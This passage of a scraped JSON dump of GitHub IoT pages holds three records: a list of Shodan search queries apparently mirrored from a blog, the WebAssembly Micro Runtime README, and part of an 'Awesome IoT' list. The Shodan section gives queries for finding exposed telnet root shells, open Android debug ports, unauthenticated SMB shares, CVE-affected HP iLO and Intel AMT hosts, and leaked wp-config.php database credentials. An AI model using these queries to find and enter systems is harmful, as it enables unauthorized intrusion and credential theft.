telnet \ud83d\udd0e \u2192\n\"root@\" port:23 -login -password -name -session\nandroid root bridges \ud83d\udd0e \u2192\na tangential result of google's sloppy fractured update approach. \ud83d\ude44 more information here.\n\"android debug bridge\" \"device\" port:5555\nlantronix serial-to-ethernet adapter leaking telnet passwords \ud83d\udd0e \u2192\nlantronix password port:30718 -secured\ncitrix virtual apps \ud83d\udd0e \u2192\n\"citrix applications:\" port:1604\ncisco smart install \ud83d\udd0e \u2192\nvulnerable (kind of \"by design,\" but especially when exposed).\n\"smart install client active\"\npbx ip phone gateways \ud83d\udd0e \u2192\npbx \"gateway console\" -password port:23\npolycom video conferencing \ud83d\udd0e \u2192\nhttp.title:\"- polycom\" \"server: lighttpd\"\ntelnet configuration: \ud83d\udd0e \u2192\n\"polycom command shell\" -failed port:23\nbomgar help desk portal \ud83d\udd0e \u2192\n\"server: bomgar\" \"200 ok\"\nintel active management cve-2017-5689 \ud83d\udd0e \u2192\n\"intel(r) active management technology\" port:623,664,16992,16993,16994,16995\nhp ilo 4 cve-2017-12542 \ud83d\udd0e \u2192\nhp-ilo-4 !\"hp-ilo-4/2.53\" !\"hp-ilo-4/2.54\" !\"hp-ilo-4/2.55\" !\"hp-ilo-4/2.60\" !\"hp-ilo-4/2.61\" !\"hp-ilo-4/2.62\" !\"hp-ilo-4/2.70\" port:1900\noutlook web access:\nexchange 2007 \ud83d\udd0e \u2192\n\"x-owa-version\" \"ie=emulateie7\" \"server: microsoft-iis/7.0\"\nexchange 2010 \ud83d\udd0e \u2192\n\"x-owa-version\" \"ie=emulateie7\" http.favicon.hash:442749392\nexchange 2013 / 2016 \ud83d\udd0e \u2192\n\"x-aspnet-version\" http.title:\"outlook\" -\"x-owa-version\"\nlync / skype for business \ud83d\udd0e \u2192\n\"x-ms-server-fqdn\"\nnetwork attached storage (nas)\nsmb (samba) file shares \ud83d\udd0e \u2192\nproduces ~500,000 results...narrow down by adding \"documents\" or \"videos\", etc.\n\"authentication: disabled\" port:445\nspecifically domain controllers: \ud83d\udd0e \u2192\n\"authentication: disabled\" netlogon sysvol -unix port:445\nconcerning default network shares of quickbooks files: \ud83d\udd0e \u2192\n\"authentication: disabled\" \"shared this folder to access quickbooks files overnetwork\" -unix port:445\nftp servers with anonymous login \ud83d\udd0e \u2192\n\"220\" \"230 login successful.\" port:21\niomega / lenovoemc nas drives \ud83d\udd0e \u2192\n\"set-cookie: iomega=\" -\"manage/login.html\" -http.title:\"log in\"\nbuffalo terastation nas drives \ud83d\udd0e \u2192\nredirecting sencha port:9000\nlogitech media servers \ud83d\udd0e \u2192\n\"server: logitech media server\" \"200 ok\"\nplex media servers \ud83d\udd0e \u2192\n\"x-plex-protocol\" \"200 ok\" port:32400\ntautulli / plexpy dashboards \ud83d\udd0e \u2192\n\"cherrypy/5.1.0\" \"/home\"\nwebcams\nexample images not necessary. \ud83e\udd26\nyawcams \ud83d\udd0e \u2192\n\"server: yawcam\" \"mime-type: text/html\"\nwebcamxp/webcam7 \ud83d\udd0e \u2192\n(\"webcam 7\" or \"webcamxp\") http.component:\"mootools\" -401\nandroid ip webcam server \ud83d\udd0e \u2192\n\"server: ip webcam server\" \"200 ok\"\nsecurity dvrs \ud83d\udd0e \u2192\nhtml:\"dvr_h264 activex\"\nprinters & copiers:\nhp printers \ud83d\udd0e \u2192\n\"serial number:\" \"built:\" \"server: hp http\"\nxerox copiers/printers \ud83d\udd0e \u2192\nssl:\"xerox generic root\"\nepson printers \ud83d\udd0e \u2192\n\"server: epson_linux upnp\" \"200 ok\"\n\"server: epson-http\" \"200 ok\"\ncanon printers \ud83d\udd0e \u2192\n\"server: ks_http\" \"200 ok\"\n\"server: canon http server\"\nhome devices\nyamaha stereos \ud83d\udd0e \u2192\n\"server: av_receiver\" \"http/1.1 406\"\napple airplay receivers \ud83d\udd0e \u2192\napple tvs, homepods, etc.\n\"\\x08_airplay\" port:5353\nchromecasts / smart tvs \ud83d\udd0e \u2192\n\"chromecast:\" port:8008\ncrestron smart home controllers \ud83d\udd0e \u2192\n\"model: pyng-hub\"\nrandom stuff\noctoprint 3d printer controllers \ud83d\udd0e \u2192\ntitle:\"octoprint\" -title:\"login\" http.favicon.hash:1307375944\netherium miners \ud83d\udd0e \u2192\n\"eth - total speed\"\napache directory listings \ud83d\udd0e \u2192\nsubstitute .pem with any extension or a filename like phpinfo.php.\nhttp.title:\"index of /\" http.html:\".pem\"\nmisconfigured wordpress \ud83d\udd0e \u2192\nexposed wp-config.php files containing database credentials.\nhttp.html:\"* the wp-config.php creation script uses this file\"\ntoo many minecraft servers \ud83d\udd0e \u2192\n\"minecraft server\" \"protocol 340\" port:25565\nliterally everything in north korea \ud83c\uddf0\ud83c\uddf5 \ud83d\udd0e \u2192\nnet:175.45.176.0/22,210.52.109.0/24,77.94.35.0/24\ntcp quote of the day \ud83d\udd0e \u2192\nport 17 (rfc 865) has a bizarre history...\nport:17 product:\"windows qotd\"\nfind a job doing this! \ud83d\udc69\u200d\ud83d\udcbc \ud83d\udd0e \u2192\n\"x-recruiting:\"\nif you've found any other juicy shodan gems, whether it's a search query or a specific example, definitely drop a comment on the blog or open an issue/pr here on github.\nbon voyage, fellow penetrators! \ud83d\ude09\nlicense\nto the extent possible under law, jake jarvis has waived all copyright and related or neighboring rights to this work.\nmirrored from a blog post at https://jarv.is/notes/shodan-search-queries/.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000046, "year": null}, {"Unnamed: 0": 53, "autor": 53, "date": null, "content": "WebAssembly Micro Runtime\nBuild WAMR VM core | Embed WAMR | Export native function | Build WASM applications | Samples\nA Bytecode Alliance project\nWebAssembly Micro Runtime (WAMR) is a standalone WebAssembly (WASM) runtime with a small footprint. It includes a few parts as below:\nThe \"iwasm\" VM core, supporting WebAssembly interpreter, ahead of time compilation (AoT) and Just-in-Time compilation (JIT)\nThe application framework and the supporting API's for the WASM applications\nThe dynamic management of the WASM applications\niwasm VM core\nkey features\n100% compliant to the W3C WASM MVP\nSmall runtime binary size (85K for interpreter and 50K for AoT) and low memory usage\nNear to native speed by AoT\nSelf-implemented module loader enables AoT working cross Linux, SGX and MCU systems\nChoices of WASM application libc support: the built-in libc subset for the embedded environment or WASI for standard libc\nEmbeddable with the supporting C API's\nThe mechanism for exporting native API's to WASM applications\nMultiple modules as dependencies, ref to sample\nThread management and pthread library, ref to sample\nLinux SGX (Intel Software Guard Extension) support\nSource debugging\nXIP (Execution In Place) support\npost-MVP features\nNon-trapping float-to-int conversions\nSign-extension operators\nBulk memory operations\nShared memory\nMulti-value\nwasm-c-api, ref to document and sample\nTail-call\n128-bit SIMD, ref to samples/workload\nReference Types, ref to document and sample\nSupported architectures and platforms\nThe iwasm supports the following architectures:\nX86-64, X86-32\nARM, THUMB (ARMV7 Cortex-M7 and Cortex-A15 are tested)\nAArch64 (Cortex-A57 and Cortex-A53 are tested)\nMIPS\nXTENSA\nRISCV64, RISCV32 (RISC-V LP64 and RISC-V LP64D are tested)\nFollowing platforms are supported. Refer to WAMR porting guide for how to port WAMR to a new platform.\nLinux, Linux SGX (Intel Software Guard Extension), MacOS, Android, Windows\nZephyr, AliOS-Things, VxWorks, NuttX, RT-Thread\nBuild iwasm VM core (mini product)\nWAMR supports building the iwasm VM core only (no app framework) to the mini product. The WAMR mini product takes the WASM application file name or AoT file name as input and then executes it. For the detailed procedure, please see build WAMR VM core and build and run WASM application. Also we can click the link of each platform above to see how to build iwasm on it.\nBuild wamrc AoT compiler\nBoth wasm binary file and AoT file are supported by iwasm. The wamrc AoT compiler is to compile wasm binary file to AoT file which can also be run by iwasm. Execute following commands to build wamrc compiler for Linux:\ncd wamr-compiler\n./build_llvm.sh (or \"./build_llvm_xtensa.sh\" to support xtensa target)\nmkdir build && cd build\ncmake .. (or \"cmake .. -DWAMR_BUILD_PLATFORM=darwin\" for MacOS)\nmake\n# wamrc is generated under current directory\nFor Windows\uff1a\ncd wamr-compiler\npython build_llvm.py\nmkdir build && cd build\ncmake ..\ncmake --build . --config Release\n# wamrc.exe is generated under .\\Release directory\nApplication framework\nBy using the iwasm VM core, we are flexible to build different application frameworks for the specific domains, although it would take quite some effort.\nThe WAMR has offered a comprehensive framework for programming WASM applications for device and IoT usages. The framework supports running multiple applications, that are based on the event driven programming model. Here are the supporting API sets by the WAMR application framework library :\nTimer, Inter-app communication (request/response and pub/sub), Sensor, Connectivity and data transmission, 2D graphic UI\nBrowse the folder core/app-framework for how to extend the application framework.\nRemote application management\nThe WAMR application manager supports remote application management from the host environment or the cloud through any physical communications such as TCP, UPD, UART, BLE, etc. Its modular design makes it able to support application management for different managed runtimes.\nThe tool host_tool communicates to the WAMR app manager for installing/uninstalling the WASM applications on companion chip from the host system. And the IoT App Store Demo shows the conception of remotely managing the device applications from the cloud.\nWAMR SDK\nUsually there are two tasks for integrating the WAMR into a particular project:\nSelect what WAMR components (vmcore, libc, app-mgr, app-framework components) to be integrated, and get the associated source files added into the project building configuration\nGenerate the APP SDK for developing the WASM apps on the selected libc and framework components\nThe WAMR SDK tools is helpful to finish the two tasks quickly. It supports menu configuration for selecting WAMR components and builds the WAMR to a SDK package that includes runtime SDK and APP SDK. The runtime SDK is used for building the native application and the APP SDK should be shipped to WASM application developers.\nSamples\nThe WAMR samples integrate the iwasm VM core, application manager and selected application framework components.\nbasic: Demonstrating how to use runtime exposed API's to call WASM functions, how to register native functions and call them, and how to call WASM function from native function.\nsimple: The runtime is integrated with most of the WAMR APP libraries, and a few WASM applications are provided for testing the WAMR APP API set. It uses built-in libc and executes apps in interpreter mode by default.\nlittlevgl: Demonstrating the graphic user interface application usage on WAMR. The whole LittleVGL 2D user graphic library and the UI application are built into WASM application. It uses WASI libc and executes apps in AoT mode by default.\ngui: Move the LittleVGL library into the runtime and define a WASM application interface by wrapping the littlevgl API. It uses WASI libc and executes apps in interpreter mode by default.\nmulti-thread: Demonstrating how to run wasm application which creates multiple threads to execute wasm functions concurrently, and uses mutex/cond by calling pthread related API's.\nspawn-thread: Demonstrating how to execute wasm functions of the same wasm application concurrently, in threads created by host embedder or runtime, but not the wasm application itself.\nmulti-module: Demonstrating the multiple modules as dependencies feature which implements the load-time dynamic linking.\nref-types: Demonstrating how to call wasm functions with argument of externref type introduced by reference types proposal.\nwasm-c-api: Demonstrating how to run some samples from wasm-c-api proposal and showing the supported API's.\nworkload: Demonstrating how to build and run some complex workloads, e.g. tensorflow-lite, XNNPACK, wasm-av1, meshoptimizer and bwa.\nProject Technical Steering Committee\nThe WAMR PTSC Charter governs the operations of the project TSC. The current TSC members:\nlum1n0us - Liang He\uff0c liang.he@intel.com\nno1wudi Qi Huang, huangqi3@xiaomi.com\nqinxk-inter - Xiaokang Qin\uff0c xiaokang.qxk@antgroup.com\nwei-tang - Wei Tang\uff0c tangwei.tang@antgroup.com\nwenyongh - Wenyong Huang\uff0c wenyong.huang@intel.com\nxujuntwt95329 - Jun Xu\uff0c Jun1.Xu@intel.com\nxwang98 - Xin Wang\uff0c xin.wang@intel.com (chair)\nLicense\nWAMR uses the same license as LLVM: the Apache 2.0 license with the LLVM exception. See the LICENSE file for details. This license allows you to freely use, modify, distribute and sell your own products based on WAMR. Any contributions you make will be under the same license.\nMore resources\nCheck out the Wiki documents for more resources:\nPerformance and footprint data\nCommunity news and events\nRoadmap\nWAMR TSC meetings\nTechnical documents", "link": "https://github.com/bytecodealliance/wasm-micro-runtime", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "webassembly micro runtime\nbuild wamr vm core | embed wamr | export native function | build wasm applications | samples\na bytecode alliance project\nwebassembly micro runtime (wamr) is a standalone webassembly (wasm) runtime with a small footprint. it includes a few parts as below:\nthe \"iwasm\" vm core, supporting webassembly interpreter, ahead of time compilation (aot) and just-in-time compilation (jit)\nthe application framework and the supporting api's for the wasm applications\nthe dynamic management of the wasm applications\niwasm vm core\nkey features\n100% compliant to the w3c wasm mvp\nsmall runtime binary size (85k for interpreter and 50k for aot) and low memory usage\nnear to native speed by aot\nself-implemented module loader enables aot working cross linux, sgx and mcu systems\nchoices of wasm application libc support: the built-in libc subset for the embedded environment or wasi for standard libc\nembeddable with the supporting c api's\nthe mechanism for exporting native api's to wasm applications\nmultiple modules as dependencies, ref to sample\nthread management and pthread library, ref to sample\nlinux sgx (intel software guard extension) support\nsource debugging\nxip (execution in place) support\npost-mvp features\nnon-trapping float-to-int conversions\nsign-extension operators\nbulk memory operations\nshared memory\nmulti-value\nwasm-c-api, ref to document and sample\ntail-call\n128-bit simd, ref to samples/workload\nreference types, ref to document and sample\nsupported architectures and platforms\nthe iwasm supports the following architectures:\nx86-64, x86-32\narm, thumb (armv7 cortex-m7 and cortex-a15 are tested)\naarch64 (cortex-a57 and cortex-a53 are tested)\nmips\nxtensa\nriscv64, riscv32 (risc-v lp64 and risc-v lp64d are tested)\nfollowing platforms are supported. refer to wamr porting guide for how to port wamr to a new platform.\nlinux, linux sgx (intel software guard extension), macos, android, windows\nzephyr, alios-things, vxworks, nuttx, rt-thread\nbuild iwasm vm core (mini product)\nwamr supports building the iwasm vm core only (no app framework) to the mini product. the wamr mini product takes the wasm application file name or aot file name as input and then executes it. for the detailed procedure, please see build wamr vm core and build and run wasm application. also we can click the link of each platform above to see how to build iwasm on it.\nbuild wamrc aot compiler\nboth wasm binary file and aot file are supported by iwasm. the wamrc aot compiler is to compile wasm binary file to aot file which can also be run by iwasm. execute following commands to build wamrc compiler for linux:\ncd wamr-compiler\n./build_llvm.sh (or \"./build_llvm_xtensa.sh\" to support xtensa target)\nmkdir build && cd build\ncmake .. (or \"cmake .. -dwamr_build_platform=darwin\" for macos)\nmake\n# wamrc is generated under current directory\nfor windows\uff1a\ncd wamr-compiler\npython build_llvm.py\nmkdir build && cd build\ncmake ..\ncmake --build . --config release\n# wamrc.exe is generated under .\\release directory\napplication framework\nby using the iwasm vm core, we are flexible to build different application frameworks for the specific domains, although it would take quite some effort.\nthe wamr has offered a comprehensive framework for programming wasm applications for device and iot usages. the framework supports running multiple applications, that are based on the event driven programming model. here are the supporting api sets by the wamr application framework library :\ntimer, inter-app communication (request/response and pub/sub), sensor, connectivity and data transmission, 2d graphic ui\nbrowse the folder core/app-framework for how to extend the application framework.\nremote application management\nthe wamr application manager supports remote application management from the host environment or the cloud through any physical communications such as tcp, upd, uart, ble, etc. its modular design makes it able to support application management for different managed runtimes.\nthe -----> tool !!!  host_tool communicates to the wamr app manager for installing/uninstalling the wasm applications on companion chip from the host system. and the iot app store demo shows the conception of remotely managing the device applications from the cloud.\nwamr sdk\nusually there are two tasks for integrating the wamr into a particular project:\nselect what wamr components (vmcore, libc, app-mgr, app-framework components) to be integrated, and get the associated source files added into the project building configuration\ngenerate the app sdk for developing the wasm apps on the selected libc and framework components\nthe wamr sdk tools is helpful to finish the two tasks quickly. it supports menu configuration for selecting wamr components and builds the wamr to a sdk package that includes runtime sdk and app sdk. the runtime sdk is used for building the native application and the app sdk should be shipped to wasm application developers.\nsamples\nthe wamr samples integrate the iwasm vm core, application manager and selected application framework components.\nbasic: demonstrating how to use runtime exposed api's to call wasm functions, how to register native functions and call them, and how to call wasm function from native function.\nsimple: the runtime is integrated with most of the wamr app libraries, and a few wasm applications are provided for testing the wamr app api set. it uses built-in libc and executes apps in interpreter mode by default.\nlittlevgl: demonstrating the graphic user interface application usage on wamr. the whole littlevgl 2d user graphic library and the ui application are built into wasm application. it uses wasi libc and executes apps in aot mode by default.\ngui: move the littlevgl library into the runtime and define a wasm application interface by wrapping the littlevgl api. it uses wasi libc and executes apps in interpreter mode by default.\nmulti-thread: demonstrating how to run wasm application which creates multiple threads to execute wasm functions concurrently, and uses mutex/cond by calling pthread related api's.\nspawn-thread: demonstrating how to execute wasm functions of the same wasm application concurrently, in threads created by host embedder or runtime, but not the wasm application itself.\nmulti-module: demonstrating the multiple modules as dependencies feature which implements the load-time dynamic linking.\nref-types: demonstrating how to call wasm functions with argument of externref type introduced by reference types proposal.\nwasm-c-api: demonstrating how to run some samples from wasm-c-api proposal and showing the supported api's.\nworkload: demonstrating how to build and run some complex workloads, e.g. tensorflow-lite, xnnpack, wasm-av1, meshoptimizer and bwa.\nproject technical steering committee\nthe wamr ptsc charter governs the operations of the project tsc. the current tsc members:\nlum1n0us - liang he\uff0c liang.he@intel.com\nno1wudi qi huang, huangqi3@xiaomi.com\nqinxk-inter - xiaokang qin\uff0c xiaokang.qxk@antgroup.com\nwei-tang - wei tang\uff0c tangwei.tang@antgroup.com\nwenyongh - wenyong huang\uff0c wenyong.huang@intel.com\nxujuntwt95329 - jun xu\uff0c jun1.xu@intel.com\nxwang98 - xin wang\uff0c xin.wang@intel.com (chair)\nlicense\nwamr uses the same license as llvm: the apache 2.0 license with the llvm exception. see the license file for details. this license allows you to freely use, modify, distribute and sell your own products based on wamr. any contributions you make will be under the same license.\nmore resources\ncheck out the wiki documents for more resources:\nperformance and footprint data\ncommunity news and events\nroadmap\nwamr tsc meetings\ntechnical documents", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000053, "year": null}, {"Unnamed: 0": 58, "autor": 58, "date": null, "content": "Awesome IoT\nA curated list of awesome Internet of Things projects and resources.\nInspired by the awesome list thing.\nTable of Contents\nHardware\nSoftware\nOperating systems\nProgramming Languages\nFrameworks\nMiddlewares\nLibraries and Tools\nMiscellaneous\nProtocols and Networks\nTechnologies\nStandards and Alliances\nResources\nBooks\nArticles\nPapers\nHardware\nArduino - Arduino is an open-source electronics platform based on easy-to-use hardware and software. It's intended for anyone making interactive projects.\nBeagleBoard - The BeagleBoard is a low-power open-source hardware single-board computer produced by Texas Instruments in association with Digi-Key and Newark element14.\nDragonboard - The DragonBoard 410c, a product of Arrow Electronics, is the development board based on the mid-tier Qualcomm\u00ae Snapdragon\u2122 410E processor. It features advanced processing power, Wi-Fi, Bluetooth connectivity, and GPS, all packed into a board the size of a credit card.\nESP32 - ESP32, the successor to the ESP8266. ESP32 is power packed with hardware features. The high speed dual core processors along with the numerous built in peripherals it is set to replace micro-controllers in connected products.\nHummingBoard - HummingBoard is a family of three Linux- and Android-ready, open source SBCs based on 1GHz Freescale i.MX6 SoCs, with a Pi-like 26-pin I/O connector.\nIntel Galileo - The Intel\u00ae Galileo Gen 2 board is the first in a family of Arduino*-certified development and prototyping boards based on Intel\u00ae architecture and specifically designed for makers, students, educators, and DIY electronics enthusiasts.\nMicroduino - Microduino and mCookie bring powerful, small, stackable electronic hardware to makers, designers, engineers, students and curious tinkerers of all ages. Build open-source projects or create innovative new ones.\nNode MCU (ESP 8266) - NodeMCU is an open source IoT platform. It uses the Lua scripting language. It is based on the eLua project, and built on the ESP8266 SDK 0.9.5.\nOLinuXino - OLinuXino is an Open Source Software and Open Source Hardware low cost (EUR 30) Linux Industrial grade single board computer with GPIOs capable of operating from -25\u00b0C to +85\u00b0C.\nOdroid - The ODROID means Open + Droid. It is a development platform for the hardware as well as the software.\nParticle - A suite of hardware and software tools to help you prototype, scale, and manage your Internet of Things products.\nPinoccio - Pinoccio is a solution to add mesh networking capability and WiFi-Internet access to all yout IoT devices, and it is Arduino compatible.\nRaspberry Pi - The Raspberry Pi is a low cost, credit-card sized computer that plugs into a computer monitor or TV, and uses a standard keyboard and mouse. It\u2019s capable of doing everything you\u2019d expect a desktop computer to do, from browsing the internet and playing high-definition video, to making spreadsheets, word-processing, and playing games.\nTessel - Tessel is a completely open source and community-driven IoT and robotics development platform. It encompases development boards, hardware module add-ons, and the software that runs on them.\nUDOO - UDOO is a single-board computer with an integrated Arduino 2 compatible microcontroller, designed for computer science education, the world of Makers and the Internet of Things.\nSoftware\nOperating systems\nApache Mynewt - Apache Mynewt is a real-time, modular operating system for connected IoT devices that need to operate for long periods of time under power, memory, and storage constraints. The first connectivity stack offered is BLE 4.2.\nARM mbed - The ARM\u00ae mbed\u2122 IoT Device Platform provides the operating system, cloud services, tools and developer ecosystem to make the creation and deployment of commercial, standards-based IoT solutions possible at scale.\nContiki - Contiki is an open source operating system for the Internet of Things. Contiki connects tiny low-cost, low-power microcontrollers to the Internet.\nFreeRTOS - FreeRTOS is a popular real-time operating system kernel for embedded devices, that has been ported to 35 microcontrollers.\nAndroid Things - Android Things extends the Android platform to all your connected devices, so they are easy to set up and work seamlessly with each other and your smartphone.\nOpenWrt - OpenWrt is an operating system (in particular, an embedded operating system) based on the Linux kernel, primarily used on embedded devices to route network traffic. The main components are the Linux kernel, util-linux, uClibc or musl, and BusyBox. All components have been optimized for size, to be small enough for fitting into the limited storage and memory available in home routers.\nSnappy Ubuntu - Snappy Ubuntu Core is a new rendition of Ubuntu with transactional updates. It provides a minimal server image with the same libraries as today\u2019s Ubuntu, but applications are provided through a simpler mechanism.\nMbed OS - Open-source operating system for Internet of Things (IoT) Cortex-M boards: low-powered, constrained and connected. Mbed OS provides an abstraction layer for the microcontrollers it runs on, so that developers can write C/C++ applications that run on any Mbed-enabled board.\nNodeOS - NodeOS is an operating system entirely written in Javascript, and managed by npm on top of the Linux kernel.\nRaspbian - Raspbian is a free operating system based on Debian optimized for the Raspberry Pi hardware.\nRIOT - The friendly Operating System for the Internet of Things.\nTiny OS - TinyOS is an open source, BSD-licensed operating system designed for low-power wireless devices, such as those used in sensor networks, ubiquitous computing, personal area networks, smart buildings, and smart meters.\nUBOS - UBOS is a Linux distro that focuses on making systems administration of home servers and Indie IoT devices running web applications much simpler. A derivative of Arch Linux, it runs on PCs, Raspberry Pis, ESPRESSObin, and cloud.\nWindows 10 IoT Core - Windows 10 IoT is a family of Windows 10 editions targeted towards a wide range of intelligent devices, from small industrial gateways to larger more complex devices like point of sales terminals and ATMs.\nZephyr Project - The Zephyr\u2122 Project is a scalable real-time operating system (RTOS) supporting multiple hardware architectures, optimized for resource constrained devices, and built with security in mind.\nProgramming languages\nThis sections regroups every awesome programming language, whether it is compiled, interpreted or a DSL, related to embedded development.\nC - A general-purpose, imperative computer programming language, supporting structured programming, lexical variable scope and recursion, while a static type system prevents many unintended operations.\nC++ - A general-purpose programming language. It has imperative, object-oriented and generic programming features, while also providing facilities for low-level memory manipulation.\nGroovy - Groovy is a powerful, optionally typed and dynamic language, with static-typing and static compilation capabilities, for the Java platform aimed at multiplying developers\u2019 productivity thanks to a concise, familiar and easy to learn syntax. It is used by the SmartThings development environment to create smart applications.\nLua - Lua is a powerful, fast, lightweight, embeddable scripting language. Lua is dynamically typed, runs by interpreting bytecode for a register-based virtual machine, and has automatic memory management with incremental garbage collection, making it ideal for configuration, scripting, and rapid prototyping.\neLua - eLua stands for Embedded Lua and the project offers the full implementation of the Lua Programming Language to the embedded world, extending it with specific features for efficient and portable software embedded development.\nELFE - ELFE is a very simple and small programming language. While it is a general-purpose programming language, it is specifically tuned to facilitate the configuration and control of swarms of small devices such as sensors or actuators.\nMicroPython - a lean and efficient Python implementation for microcontrollers and constrained systems\nPharoThings - Live programming platform for IoT projects based on Pharo (a pure object-oriented programming language and a powerful environment, focused on simplicity and immediate feedback).\nRust - Rust is a language focused on performance, reliability and productivity. It is known for its safety, it is memory safe, it uses a borrow checker, and concurrency is also safe.\nTinyGo - TinyGo is a project to bring the Go programming language to microcontrollers and modern web browsers by creating a new compiler based on LLVM. You can compile and run TinyGo programs on many different microcontroller boards such as the BBC micro:bit and the Arduino Uno.\nFrameworks\nAllJoyn - AllJoyn is an open source software framework that makes it easy for devices and apps to discover and communicate with each other.\nApple HomeKit - HomeKit is a framework for communicating with and controlling connected accessories in a user\u2019s home.\nAREG SDK - AREG SDK is an interface-centric real-time asynchronous communication engine to enable distributed- and mist-computing, where connected Things interact and provide services, as if they act like thin distributed servers.\nAstarte - Astarte is an Open Source IoT platform written in Elixir. It is a turnkey solution which packs in everything you need for connecting a device fleet to a set of remote applications. It performs data modeling, automated data reduction, real-time events, and provides you with any feature you might expect in a modern IoT platform. Right now, Linux and ESP32 devices are supported out of the box using the provided SDKs.\nBlynk - Blynk is a platform for creating iOS and Android apps for connected things. You can easily build graphic interfaces for all your projects by simply dragging and dropping widgets (right on the smartphone). Supports Ethernet, WiFi, Bluetooth, GSM/GPRS, USB/Serial connections with wide range of prototyping platforms from Arduino, Raspberry, ARM mbed, Particle, RedBear, etc.\nCountly IoT Analytics - Countly is a general purpose analytics platform for mobile and IoT devices, available as open source.\nEclipse Ditto\u2122 - Eclipse Ditto is a framework for building so called \"digital twins\". It provides a cloud based representation and APIs to interact with connected physical devices. Ditto provides built-in authorization, search and connectivity capabilities to integrate with foreign systems like MQTT brokers, HTTP endpoints and Apache Kafka.\nEclipse Smarthome - The Eclipse SmartHome framework is designed to run on embedded devices, such as a Raspberry Pi, a BeagleBone Black or an Intel Edison. It requires a Java 7 compliant JVM and an OSGi (4.2+) framework, such as Eclipse Equinox.\nFreedomotic - Freedomotic is an open source, flexible, secure Internet of Things (IoT) development framework, useful to build and manage modern smart spaces. It is targeted to private individuals (home automation) as well as business users (smart retail environments, ambient aware marketing, monitoring and analytics, etc). Written in Java, it can interact with well known standard building automation protocols as well as with \"do it yourself\" solutions.\nIotivity - IoTivity is an open source software framework enabling seamless device-to-device connectivity to address the emerging needs of the Internet of Things.\nKura - Kura aims at offering a Java/OSGi-based container for M2M applications running in service gateways. Kura provides or, when available, aggregates open source implementations for the most common services needed by M2M applications.\nLelylan - Lelylan is an IoT cloud platform based on a lightweight microservices architecture. The Lelylan platform is both hardware-agnostic and platform-agnostic. This means that you can connect any hardware, from the ESP8266 to the most professional embedded hardware solution and everything in between - and it can run on any public cloud, your own private datacenter, or even in a hybrid environment, whether virtualized or bare metal.\nMacchina.io - macchina.io EDGE is a rich software framework for quickly building IoT device applications running on Linux-based devices. macchina.io EDGE implements a web-enabled, secure, modular and extensible JavaScript and C++ runtime environment and provides ready-to-use and industry proven software building blocks. These enable devices to talk to various sensors, other devices and cloud services, and to process, analyze and filter sensor data locally, at the edge device or within the local network.\nMihini - The main goal of Mihini is to deliver an embedded runtime running on top of Linux, that exposes high-level API for building M2M applications. Mihini aims at enabling easy and portable development, by facilitating access to the I/Os of an M2M system, providing a communication layer, etc.\nOpenHAB - The openHAB runtime is a set of OSGi bundles deployed on an OSGi framework (Equinox). It is therefore a pure Java solution and needs a JVM to run. Being based on OSGi, it provides a highly modular architecture, which even allows adding and removing functionality during runtime without stopping the service.\nGobot - Gobot is a framework for robotics, physical computing, and the Internet of Things, written in the Go programming language.\nHome Assistant - Home Assistant is a home automation platform running on Python 3. The goal of Home Assistant is to be able to track and control all devices at home and offer a platform for automating control.\nLightweight MQTT Machine Network - LWMQN is an open source project that follows part of OMA LWM2M v1.0 specification and uses the IP-base Smart Object model to meet the minimum requirements of machine network management. It provides both server-side and machine-side libraries to make full-stack IoT development possible with JavaScript and Node.js. See also: IPSO Alliance Technical Archive.\nThingsboard IoT Gateway - Open-source IoT Gateway - integrates devices connected to legacy and third-party systems with Thingsboard IoT Platform using OPC-UA and MQTT protocols.\nPimatic - Pimatic is a home automation framework that runs on node.js. It provides a common extensible platform for home control and automation tasks.\nIOTA - Open-source distributed ledger protocol for IoT. Uses a directed acyclic graph (DAG) instead of a blockchain.\nMyController - The Open Source Controller. MyController.org is an IoT automation controller for home, office or any place.\nMozilla WebThings - An open platform for monitoring and controlling devices over the web.\nHStreamDB - The streaming database built for IoT data storage and real-time processing.\nMiddlewares\nCorlysis - Corlysis is a platform that helps you with storing and visualizing your time-series data. It is based on the open-source projects Grafana and InfluxDB that also SpaceX uses.\nIFTTT - IFTTT is a web-based service that allows users to create chains of simple conditional statements, called \"recipes\", which are triggered based on changes to other web services such as Gmail, Facebook, Instagram, and Pinterest. IFTTT is an abbreviation of \"If This Then That\" (pronounced like \"gift\" without the \"g\").\nOPC Router - IoT Gateway with various plug-ins (OPC UA, Mqtt, SQL, REST, SAP, InfluxDB, Printer, ...)\nHuginn - Huginn is a system for building agents that perform automated tasks for you online.\nKaa - An open-source middleware platform for rapid creation of IoT solutions.\nLosant - Losant is an easy-to-use and powerful developer platform designed to help you quickly and securely build complex connected solutions. Losant uses open communication standards like REST and MQTT to provide connectivity from one to millions of devices. Losant provides powerful data collection, aggregation, and visualization features to help understand and quantify vast amounts of sensor data. Losant's drag-and-drop workflow editor allows you to trigger actions, notifications, and machine-to-machine communication without programming.\nMicroServiceBus.com - MicroServiceBus.com is a device management platform for Azure, AWS and IBM IoT Hub, with integration to GitHub, ServiceNow, Cisco Jasper and more. It comes in a free (limited) version along with enterprise offerings.\nDreamFactory - DreamFactory is a free open source REST API Platform for mobile, web and IoT Applications.\nHiveMQ - Enterprise ready MQTT broker that can scale to connect millions of IoT devices.\nI1820 - I1820 is a free open source platform which provides discovery, data collection and configuration services based on MQTT. I1820 implements a REST API for controlling the things and it stores all collected data in a Time-Series database named InfluxDB.\nIOStash - IOStash is a high performance IoT platform that is free for DIY developers and non profit applications. It has multiple connectivity options and enables easy development of M2M or M2A applications. IOStash offers Nodejs and Android libraries for easy application creation.\nThingsboard - An open-source IoT platform. Device management, data collection, processing and visualization for your IoT solution.\nThingspeak - An open-source IoT analytics platform service that allows you to aggregate, visualize, and analyze live data streams in the cloud. You can send data to ThingSpeak from your devices, create instant visualization of live data, and send alerts.\nVerneMQ - VerneMQ is a high-performance, distributed MQTT broker that connects IoT, M2M, Mobile, and web applications. It scales horizontally and vertically on commodity hardware to support a high number of concurrent publishers and consumers while maintaining low latency and fault tolerance.\nKuzzle - An open-source backend with advanced features like real-time pub/sub or geofencing and a multiprotocol interface that supports MQTT, LoRaWAN and more. (Website)\nDevicePilot - Operational analytics for connected devices (includes free-forever tier).\nEMQ X - Scalable and Reliable Real-time MQTT Messaging Engine for IoT in 5G 